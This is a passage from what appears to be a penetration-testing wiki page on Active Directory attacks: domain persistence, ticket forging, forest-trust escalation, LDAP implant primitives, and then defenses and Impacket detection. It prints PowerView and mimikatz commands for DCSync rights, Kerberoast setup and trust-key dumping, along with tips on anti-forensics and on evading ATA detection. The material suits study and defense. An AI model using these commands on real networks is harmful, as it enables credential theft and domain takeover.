通常、users は RDP 経由で system に access するため、ここでは third party RDP sessions に対して実行できるいくつかの attacks を示します。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** は domain-joined computers 上の **local Administrator password** を管理するための system であり、password が **randomized** され、unique で、頻繁に **changed** されることを保証します。これらの passwords は Active Directory に保存され、access は authorized users のみに ACLs で制御されます。これらの passwords に access できる十分な permissions があれば、他の computers への pivot が可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

compromised machine から **certificates を gather** することは、environment 内で privileges を escalate する方法になり得ます。


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates** が configured されている場合、それらを abuse して privileges を escalate できます。


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin**、またはさらに望ましくは **Enterprise Admin** privileges を取得すると、**domain database**: _ntds.dit_ を **dump** できます。

[**DCSync attack の詳細はこちら**](dcsync.md)。

[**NTDS.dit を steal する方法の詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前述した techniques の一部は persistence に使用できます。\
例えば、以下のことが可能です。

- Users を [**Kerberoast**](kerberoast.md) に vulnerable にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users を [**ASREPRoast**](asreproast.md) に vulnerable にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- User に [**DCSync**](#dcsync) privileges を grant する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、**NTLM hash**（例えば **PC account の hash**）を使用して、特定の service 用の **legitimate Ticket Granting Service (TGS) ticket** を作成します。この method は、**service privileges に access** するために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** では、attacker が Active Directory (AD) environment 内の **krbtgt account の NTLM hash** への access を取得します。この account は、AD network 内での authentication に不可欠な、すべての **Ticket Granting Tickets (TGTs)** への署名に使用される特殊な account です。

attacker はこの hash を取得すると、任意の account 用の **TGTs** を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、**一般的な golden tickets detection mechanisms を bypass** する方法で forged された golden tickets のようなものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**account の certificates を持っている、または certificates を request できること**は、user が password を変更した場合でも、その account 内で persistence するための非常に良い方法です。


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates を使用して、domain 内で high privileges のまま persistence する**ことも可能です。


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** object は、これらの groups 全体に標準の **Access Control List (ACL)** を適用することで、Domain Admins や Enterprise Admins のような **privileged groups** の security を保証し、unauthorized changes を防止します。しかし、この feature は exploit 可能です。attacker が AdminSDHolder の ACL を変更して regular user に full access を与えると、その user はすべての privileged groups を広範に control できるようになります。この保護を目的とした security measure は、厳密に monitoring されていなければ、逆に unwarranted access を許してしまう可能性があります。

[**AdminDSHolder Group の詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** 内には **local administrator** account が存在します。そのような machine 上で admin rights を取得すると、**mimikatz** を使用して local Administrator hash を extract できます。その後、**この password の使用を enable** するために registry modification が必要となり、local Administrator account への remote access が可能になります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定の domain objects に対して、user が **将来 privileges を escalate** できるような **special permissions** を **user に give** できます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** は、ある **object が別の object に対して持つ permissions** を **store** するために使用されます。object の **security descriptor に小さな変更を加える**だけで、privileged group の member になる必要なく、その object に対する非常に興味深い privileges を取得できます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class を abuse して、`entryTTL`/`msDS-Entry-Time-To-Die` により短命な principals/GPOs/DNS records を作成します。これらは tombstones を残さずに self-delete し、LDAP evidence を消去する一方で、orphan SIDs、壊れた `gPLink` references、または cached DNS responses（例: AdminSDHolder ACE pollution や malicious な `gPCFileSysPath`/AD-integrated DNS redirects）を残します。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

memory 内の **LSASS** を alter して **universal password** を確立し、すべての domain accounts への access を許可します。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) とは何かはこちらで説明しています。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成し、machine への access に使用された **credentials** を **clear text** で **capture** できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に **new Domain Controller** を register し、それを使用して指定した objects に **attributes**（SIDHistory、SPNs...）を **push** します。この際、**modifications** に関する **logs** を残しません。**DA** privileges が必要で、**root domain** 内にいる必要があります。\
誤った data を使用すると、非常に見苦しい logs が出現する点に注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

以前、**LAPS passwords を read する十分な permission** がある場合に privileges を escalate する方法について説明しました。しかし、これらの passwords は **persistence を maintain** するためにも使用できます。\
以下を確認してください。


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** を security boundary とみなしています。これは、**single domain を compromise すると、entire Forest が compromise される可能性がある**ことを意味します。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **domain** の user が別の **domain** の resources に access できるようにする security mechanism です。これは基本的に、2 つの domains の authentication systems 間に linkage を作成し、authentication verifications が seamless に flow できるようにします。domains が trust を設定すると、trust の integrity に不可欠な特定の **keys** を交換し、**Domain Controllers (DCs)** 内に保持します。

一般的な scenario では、user が **trusted domain** 内の service に access する場合、まず自身の domain の DC から **inter-realm TGT** と呼ばれる special ticket を request する必要があります。この TGT は、両 domains が合意した shared **key** で encrypted されます。次に user はこの TGT を **trusted domain の DC** に提示し、service ticket（**TGS**）を取得します。trusted domain の DC が inter-realm TGT の validation に成功すると、TGS を issue し、user に service への access を grant します。

**Steps**:

1. **Domain 1** の **client computer** が、自身の **NTLM hash** を使用して **Domain Controller (DC1)** から **Ticket Granting Ticket (TGT)** を request することで process を開始します。
2. client の authentication に成功すると、DC1 は新しい TGT を issue します。
3. 次に client は、**Domain 2** の resources に access するために必要な **inter-realm TGT** を DC1 に request します。
4. inter-realm TGT は、two-way domain trust の一部として DC1 と DC2 が共有する **trust key** で encrypted されます。
5. client は inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に渡します。
6. DC2 は shared trust key を使用して inter-realm TGT を verify し、有効な場合、client が access したい Domain 2 の server 用に **Ticket Granting Service (TGS)** を issue します。
7. 最後に client はこの TGS を server に提示します。TGS は server の account hash で encrypted されており、Domain 2 の service への access を取得します。

### Different trusts

**trust には 1 way または 2 ways がある**ことに注意することが重要です。2 ways の場合、両 domains は互いを trust しますが、**1 way** の trust relation では、一方の domain が **trusted** domain、もう一方が **trusting** domain になります。この場合、**trusted domain から trusting domain 内の resources にのみ access できます**。

Domain A が Domain B を trust する場合、A が trusting domain で、B が trusted domain です。さらに、**Domain A** ではこれは **Outbound trust**、**Domain B** では **Inbound trust** になります。

**Different trusting relationships**

- **Parent-Child Trusts**: 同じ forest 内で一般的な構成です。child domain は parent domain と自動的に two-way transitive trust を持ちます。これは基本的に、authentication requests が parent と child の間を seamless に flow できることを意味します。
- **Cross-link Trusts**: "shortcut trusts" とも呼ばれ、referral processes を高速化するために child domains 間に設定されます。complex forests では、authentication referrals は通常 forest root まで上がり、その後 target domain へ下る必要があります。cross-links を作成するとこの経路が短縮され、geographically dispersed environments で特に有効です。
- **External Trusts**: 異なる、無関係な domains 間に設定され、本質的に non-transitive です。[Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) によると、external trusts は、forest trust で接続されていない current forest 外の domain にある resources へ access する場合に役立ちます。external trusts では SID filtering により security が強化されます。
- **Tree-root Trusts**: forest root domain と新しく追加された tree root の間に自動的に確立されます。一般的ではありませんが、tree-root trusts は forest に新しい domain trees を追加する際に重要であり、新しい domain trees が unique な domain name を維持し、two-way transitivity を確保できるようにします。詳細は [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) にあります。
- **Forest Trusts**: 2 つの forest root domains 間の two-way transitive trust であり、security measures を強化するため SID filtering も強制します。
- **MIT Trusts**: non-Windows の [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains との間に確立されます。MIT trusts はより specialized で、Windows ecosystem 外の Kerberos-based systems との integration が必要な environments に対応します。

#### **trusting relationships** におけるその他の違い

- trust relationship は **transitive**（A が B を trust し、B が C を trust する場合、A は C を trust する）または **non-transitive** にできます。
- trust relationship は **bidirectional trust**（双方が互いを trust する）または **one-way trust**（一方だけが他方を trust する）として設定できます。

### Attack Path

1. trusting relationships を **Enumerate** する
2. **security principal**（user/group/computer）が **other domain** の resources に **access** できるか確認します。ACE entries によるものか、other domain の groups に所属しているためかを確認します。**domains 間の relationships**（おそらくこれが trust を作成した理由です）を探します。
1. この場合、kerberoast も別の option になり得ます。
3. domains 間を **pivot** できる **accounts** を **Compromise** します。

Attackers が別の domain の resources に access できる primary mechanisms は 3 つあります。

- **Local Group Membership**: principals は、server の “Administrators” group など、machines 上の local groups に追加されることがあり、その machine に対する大きな control が与えられます。
- **Foreign Domain Group Membership**: principals は foreign domain 内の groups の member になることもできます。ただし、この method の有効性は trust の性質と group の scope に依存します。
- **Access Control Lists (ACLs)**: principals は **ACL** 内、特に **DACL** 内の **ACEs** の entities として指定され、specific resources への access を与えられることがあります。ACLs、DACLs、ACEs の mechanics を詳しく知りたい場合、whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” は非常に有用な resource です。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認すると、domain 内の foreign security principals を見つけられます。これらは **external domain/forest** の user/group です。

これを **Bloodhound** または powerview を使用して確認できます。
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン trust を enumerate するその他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2つの信頼キー**があります。1つは _Child --> Parent_ 用で、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているものは、次のコマンドで確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を悪用して trust 経由で child/parent domain の Enterprise admin に昇格します:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 書き込み可能な Configuration NC の Exploit

Configuration Naming Context (NC) をどのように exploit できるかを理解することは重要です。Configuration NC は、Active Directory (AD) 環境において、forest 全体の構成データを格納する中央リポジトリとして機能します。このデータは forest 内のすべての Domain Controller (DC) に複製され、書き込み可能な DC は Configuration NC の書き込み可能なコピーを保持します。これを exploit するには、**DC 上の SYSTEM privileges** が必要であり、child DC が望ましいです。

**GPO を root DC site にリンクする**

Configuration NC の Sites container には、AD forest 内のすべての domain-joined computer の site に関する情報が含まれています。任意の DC 上で SYSTEM privileges を使用することで、攻撃者は GPO を root DC site にリンクできます。この操作により、これらの site に適用される policy を操作し、root domain を侵害できる可能性があります。

詳しい情報については、[Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) に関する research を参照してください。<sup>[[12]](#references)</sup>

**forest 内の任意の gMSA を Compromise する**

別の attack vector として、domain 内の privileged gMSA を標的にする方法があります。gMSA の password の計算に不可欠な KDS Root key は、Configuration NC 内に保存されています。任意の DC 上で SYSTEM privileges を持っていれば、KDS Root key にアクセスし、forest 全体の任意の gMSA の password を計算できます。

詳細な分析と step-by-step の手順については、以下を参照してください:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA attack (BadSuccessor – migration attributes の abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

この方法では、新しい privileged AD object が作成されるまで待つ忍耐が必要です。SYSTEM privileges により、攻撃者は AD Schema を変更し、任意の user にすべての class に対する完全な control を付与できます。これにより、新しく作成された AD object への不正な access と control が可能になるおそれがあります。

詳しくは、[Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) を参照してください。<sup>[[14]](#references)</sup>

**DA から EA への ADCS ESC5**

ADCS ESC5 vulnerability は、Public Key Infrastructure (PKI) object に対する control を利用して、forest 内の任意の user として authentication できる certificate template を作成するものです。PKI object は Configuration NC 内に存在するため、書き込み可能な child DC を compromise すると ESC5 attack を実行できます。

詳細は [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) を参照してください。<sup>[[15]](#references)</sup> ADCS が存在しない環境では、攻撃者は必要な component をセットアップできます。詳細は [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) で説明されています。<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインは外部ドメインから信頼されており**、その外部ドメインに対して**不特定の権限**が与えられています。あなたのドメインの**どの principal が外部ドメインに対してどのアクセス権を持っているか**を特定し、その後、それを exploit する必要があります:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは、**あなたのドメイン**が、**異なるドメイン**の principal に対して、いくつかの **privileges** を**信頼**しています。

しかし、ある **domain** が trusting domain によって**信頼される**と、trusted domain は**予測可能な名前**の user を作成し、その **password** には trusted password を使用します。つまり、**trusting domain の user にアクセスして trusted domain 内部へ侵入**し、列挙を行って、さらに privileges の escalation を試みることが可能です:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を compromise する別の方法は、domain trust の**反対方向**に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

trusted domain を compromise する別の方法は、trusted domain の **user がアクセス可能な** machine で待機し、その user が **RDP** 経由で login するのを待つことです。その後、attacker は RDP session process に code を inject し、そこから **victim の origin domain にアクセス**できます。\
さらに、**victim が hard drive を mount していた**場合、attacker は **RDP session** process から、hard drive の **startup folder** に **backdoors** を保存できます。この technique は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse の mitigation

### **SID Filtering:**

- forest trusts を介して SID history attribute を悪用する attack の risk は、SID Filtering によって軽減されます。SID Filtering は、すべての inter-forest trust でデフォルトで有効化されています。これは、Microsoft の方針に従い、security boundary を domain ではなく forest とみなし、intra-forest trust は secure であるという前提に基づいています。
- ただし、注意点があります。SID filtering は applications や user access を妨げる可能性があるため、無効化されることがあります。

### **Selective Authentication:**

- inter-forest trust では、Selective Authentication を使用することで、2 つの forest の user が自動的に authenticated されないようにできます。代わりに、trusting domain または forest 内の domains や servers に user が access するには、明示的な permissions が必要になります。
- これらの対策では、writable Configuration Naming Context (NC) の exploit や trust account への attacks からは保護されない点に注意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implants からの LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD-style の LDAP primitives を、on-host implant（例: Adaptix C2）内だけで実行される x64 Beacon Object Files として再実装します。Operators は `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` で pack を compile し、`ldap.axs` を load してから、beacon で `ldap <subcommand>` を呼び出します。すべての traffic は、LDAP (389) 上では signing/sealing を使用する現在の logon security context 経由で、または LDAPS (636) 上では auto certificate trust を使用して送信されるため、socks proxies や disk artifacts は必要ありません。<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`、`get-computers`、`get-groups`、`get-usergroups`、`get-groupmembers` は、short names/OU paths を full DNs に解決し、対応する objects を dump します。
- `get-object`、`get-attribute`、`get-domaininfo` は、任意の attributes（security descriptors を含む）と、`rootDSE` から forest/domain metadata を取得します。
- `get-uac`、`get-spn`、`get-delegation`、`get-rbcd` は、roasting candidates、delegation settings、既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors を LDAP から直接表示します。
- `get-acl` と `get-writable --detailed` は DACL を parse し、trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）、inheritance を一覧表示します。これにより、ACL privilege escalation の即時 target を特定できます。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### エスカレーションと persistence のための LDAP write primitives

- オブジェクト作成 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）により、オペレーターは OU の権限が存在する場所に新しい principal または machine account を準備できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property 権限が見つかった対象を直接 hijack します。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` などの ACL に重点を置いたコマンドは、任意の AD オブジェクトに対する WriteDACL/WriteOwner を、パスワードリセット、group membership の制御、または PowerShell/ADSI の痕跡を残さない DCSync replication privileges に変換します。`remove-*` の counterpart により、追加した ACE を cleanup できます。

### Delegation、roasting、Kerberos abuse

- `add-spn`/`set-spn` により、侵害した user を即座に Kerberoastable にできます。`add-asreproastable`（UAC toggle）は、パスワードに触れることなく AS-REP roasting の対象としてマークします。
- Delegation macro（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC flags、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD attack path を有効にします。これにより、remote PowerShell や RSAT は不要になります。

### sidHistory injection、OU relocation、attack surface shaping

- `add-sidhistory` は、管理下の principal の SID history に privileged SID を inject します（[SID-History Injection](sid-history-injection.md) を参照）。これにより、LDAP/LDAPS のみで stealthy な access inheritance を提供します。
- `move-object` は computer または user の DN/OU を変更します。攻撃者は、`set-password`、`add-groupmember`、`add-spn` を abuse する前に、delegated rights がすでに存在する OU へ asset を移動できます。
- 範囲を厳密に限定した removal command（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）により、オペレーターは credential または persistence を harvest した後、迅速に rollback できます。これにより telemetry を最小限に抑えられます。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**credential の保護方法について詳しく学ぶ。**](../stealing-credentials/credentials-protections.md)

### **Credential 保護のための防御対策**

- **Domain Admins の制限**: Domain Admins は Domain Controllers にのみ login を許可し、他の host では使用しないことを推奨します。
- **Service Account の privileges**: セキュリティを維持するため、service は Domain Admin（DA）privileges で実行しないでください。
- **Temporal Privilege Limitation**: DA privileges が必要な task では、その継続時間を制限する必要があります。これは次のように実現できます: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay の mitigation**: Event ID 2889/3074/3075 を audit し、その後 DC/client で LDAP signing と LDAPS channel binding を enforce して、LDAP MITM/relay attempt を block します。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity の protocol-level fingerprinting

一般的な AD tradecraft を detect したい場合、rename された binary、service name、temporary batch file、output path など、**operator が制御できる artifact のみに依存しないでください**。[Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI の traffic を正規の Windows client がどのように構成するか baseline 化し、そのうえで、オペレーターが `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py` を編集した後も残る **implementation quirk** を探します。<sup>[[8]](#references)</sup>

- **High-confidence standalone candidate**（独自の baseline に対して validation した後）:
- `auth_context_id = 79231 + ctx_id` を使用する authenticated DCE/RPC
- `0xff` で埋められた DCE/RPC authentication padding
- raw Kerberos `AP-REQ` を SPNEGO の `mechToken` に直接配置する LDAP Kerberos bind
- ASCII に見える `ClientGuid` 値を含む SMB2/3 negotiate request
- 非標準 namespace `//./root/cimv2` を使用する WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce 値
- **Correlation/scoring feature としての利用がより適切**:
- Sparse または duplicated な Kerberos etype list、unusual/missing な `PA-DATA`、または native Windows と異なる TGS-REQ etype ordering
- Version info がない NTLM Type 1 message、または null host name を持つ Type 3 message
- SPNEGO ではなく DCE/RPC 内に raw NTLMSSP が含まれるもの、DCE/RPC verification trailer の欠落、または SPNEGO/Kerberos OID mismatch
- 同じ host/user/session/time window からこれらの trait が複数確認される場合、単一の弱い field よりもはるかに強い signal になります
- **Standalone alert ではなく enrichment として利用**:
- Default filename、output path、random service name、temporary batch name、default computer account name、tool-specific HTTP/WebDAV/RDP/MSSQL string
- これらはオペレーターが容易に変更できるため、cross-protocol cluster が suspicious である理由の説明に使うのが最適です
- **Operational notes**:
- これらの signal の一部には、decrypted traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、または service-side visibility が必要です
- alert に昇格させる前に、Samba/Linux client、appliance、legacy software に対して validation してください
- baseline への信頼度を高めながら、detection を enrichment -> hunting -> alerting の順に昇格させます

### **Deception Techniques の実装**

- Deception の実装では、password が expire しない、または Trusted for Delegation として mark されている decoy user や computer などの trap を設定します。詳細な approach には、特定の rights を持つ user の作成や、high privilege group への追加が含まれます。<sup>[[2]](#references)</sup>
- 実用的な例として、次のような tool を使用できます: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques の deploy について詳しくは、[Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **Deception の識別**

- **User Object の場合**: suspicious indicator には、通常と異なる ObjectSID、少ない logon、creation date、低い bad password count などがあります。
- **一般的な indicator**: decoy object の候補と genuine object の attribute を比較すると、inconsistency を発見できます。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) などの tool は、このような deception の識別に役立ちます。

### **Detection System の bypass**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection を防ぐため、Domain Controller 上での session enumeration を回避します。
- **Ticket Impersonation**: ticket creation に **aes** key を利用すると、NTLM への downgrade を行わないため detection を evade できます。
- **DCSync Attack**: ATA detection を回避するため、non-Domain Controller から実行することが推奨されます。Domain Controller から直接実行すると alert が trigger されます。

## References

- [1] [Domain Trust を攻撃するためのガイド](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory における Deception のための Trust Forging](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin から Enterprise Admin へ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection - Active Directory Exploitation のための In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec - Holy Shuck! NTLM Hash を Wordlist として Weaponize する](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF（NetExec AD Lab）- Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs - Impacket の分析](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon 経由で Active Directory Account を takeover する](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 に関連する Netlogon secure channel connection の変更を管理する方法](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [忘れられた Null Session と MS-RPC interface への journey](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domain 間の security boundary としての SID filter?（Part 4）- SID filtering bypass research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domain 間の security boundary としての SID filter?（Part 5）- Golden GMSA trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domain 間の security boundary としての SID filter?（Part 6）- Schema change trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 による DA から EA への escalation](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS を abuse して child domain の admin から enterprise admin へ 5 分で escalation する方法、その follow-up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoor の設計](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
